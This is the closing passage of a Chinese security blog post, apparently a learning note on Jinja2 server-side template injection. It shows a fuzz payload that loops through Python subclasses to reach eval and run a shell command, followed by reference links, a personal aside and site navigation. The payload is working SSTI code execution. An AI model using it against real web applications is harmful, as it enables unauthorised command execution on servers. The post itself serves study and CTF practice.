+<h3 id="控制语句Fuzz"><a href="#控制语句Fuzz" class="headerlink" title="控制语句Fuzz"></a>控制语句Fuzz</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接插在注入点即可</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p>
+<p><a href="https://www.smi1e.top/flask-jinja2-ssti-%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://www.smi1e.top/flask-jinja2-ssti-%E5%AD%A6%E4%B9%A0/</a></p>
+<p><a href="https://www.anquanke.com/post/id/188172#h3-14" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188172#h3-14</a></p>
+<p><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/120/</a></p>
+<p><a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/</a></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>女神脱单了。。也没什么好遗憾的，女神幸福就好，祝他们早日分手吧= =</p>
+<p>她真的是，很特别的那种，实话说她长相一般，但是她的性格，仿佛能驱散我内心的抑郁。</p>
+<p>还有一些小坑以及几道题以及前置知识，下次再说，准备比赛了。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/08/SQLI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="next" title="sqli-labs速刷通关">
+                <i class="fa fa-chevron-left"></i> sqli-labs速刷通关
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/25/%E6%95%B0%E7%BB%84%E9%94%AE%E6%88%AA%E6%96%AD%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/" rel="prev" title="数组键截断与参数注入">
+                数组键截断与参数注入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="sketch_pl4ne" />
+            
+              <p class="site-author-name" itemprop="name">sketch_pl4ne</p>
+              <p class="site-description motion-element" itemprop="description">wym</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhaoj.in/" title="glzjin" target="_blank">glzjin</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lihuaiqiu.github.io/" title="离怀秋" target="_blank">离怀秋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/wfzWebSecuity/" title="tr1ple" target="_blank">tr1ple</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southsea.st/" title="南溟" target="_blank">南溟</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前置知识"><span class="nav-number">2.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSTI-判断流程"><span class="nav-number">3.</span> <span class="nav-text">SSTI 判断流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-under-python2"><span class="nav-number">4.</span> <span class="nav-text">payload under python2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#读文件"><span class="nav-number">4.1.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写文件"><span class="nav-number">4.2.</span> <span class="nav-text">写文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行"><span class="nav-number">4.3.</span> <span class="nav-text">命令执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-under-python3"><span class="nav-number">5.</span> <span class="nav-text">payload under python3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行-1"><span class="nav-number">5.1.</span> <span class="nav-text">命令执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bypass-tricks"><span class="nav-number">6.</span> <span class="nav-text">Bypass tricks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#字符拼接"><span class="nav-number">6.1.</span> <span class="nav-text">字符拼接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编码绕过"><span class="nav-number">6.2.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-中括号"><span class="nav-number">6.3.</span> <span class="nav-text">Bypass 中括号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-下划线"><span class="nav-number">6.4.</span> <span class="nav-text">Bypass 下划线</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-左双花括号"><span class="nav-number">6.5.</span> <span class="nav-text">Bypass 左双花括号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他姿势"><span class="nav-number">6.6.</span> <span class="nav-text">其他姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#无-globals-命令执行"><span class="nav-number">6.6.1.</span> <span class="nav-text">无__globals__命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加载自定义模块"><span class="nav-number">6.6.2.</span> <span class="nav-text">加载自定义模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#控制语句Fuzz脚本"><span class="nav-number">6.6.3.</span> <span class="nav-text">控制语句Fuzz脚本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Some-scripts"><span class="nav-number">7.</span> <span class="nav-text">Some scripts</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建"><span class="nav-number">7.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fuzz-py2"><span class="nav-number">7.2.</span> <span class="nav-text">Fuzz_py2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fuzz-all"><span class="nav-number">7.3.</span> <span class="nav-text">Fuzz_all</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#控制语句Fuzz"><span class="nav-number">7.4.</span> <span class="nav-text">控制语句Fuzz</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">8.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">9.</span> <span class="nav-text">小结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sketch_pl4ne</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">36.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
